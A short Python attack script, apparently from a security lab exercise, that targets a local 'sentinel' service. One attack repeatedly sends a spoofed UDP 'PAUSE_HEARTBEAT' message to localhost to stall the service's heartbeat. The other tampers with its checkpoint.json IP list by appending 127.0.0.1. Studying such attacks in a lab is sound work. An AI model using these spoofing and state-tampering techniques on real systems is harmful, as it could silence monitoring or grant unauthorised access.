import json
import socket
import time
import sys
import shutil
from pathlib import Path

HOST = "127.0.0.1"
SENTINEL_SCRIPT = "sentinel.py"
CHECKPOINT = Path.cwd() / "checkpoint.json"
VICTIM_PORT = 5000

# Attack 1
def delay_heartbeat():

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sender:
        while True:
            message = b"PAUSE_HEARTBEAT"
            # Sends the fake heartbeat message to the specified IP address and port
            sender.sendto(message, ("127.0.0.1", VICTIM_PORT))

            print("Sent delay:", message)

            time.sleep(30)

# Attack 2
def tampered_checkpoint():
    """Back up the original checkpoint, then add a test entry to the state."""
    original_copy = CHECKPOINT.with_name(f"{CHECKPOINT.stem}.original{CHECKPOINT.suffix}")

    try:
        shutil.copy2(CHECKPOINT, original_copy)
        state = json.loads(CHECKPOINT.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError) as error:
        raise SystemExit(f"Cannot read {CHECKPOINT}: {error}")

    if not isinstance(state, list) or not all(isinstance(item, str) for item in state):
        raise SystemExit("Checkpoint must contain a JSON list of IP strings")

    if HOST not in state:
        state.append(HOST)

    temp_path = CHECKPOINT.with_suffix(".json.tmp")
    temp_path.write_text(json.dumps(state), encoding="utf-8")
    temp_path.replace(CHECKPOINT)
    print(
        f"Saved original checkpoint to {original_copy}; "
        f"tampered checkpoint by adding {HOST}."
    )



if __name__ == "__main__":
    
    try:
        if len(sys.argv) != 2:
            print("Usage: python attacker.py delay | tamper")

        elif sys.argv[1] == "delay":
            delay_heartbeat()

        elif sys.argv[1] == "tamper":
            tampered_checkpoint()

        else:
            print("Invalid attack. Choose 'delay' or 'tamper'.")

    except KeyboardInterrupt:
        pass

    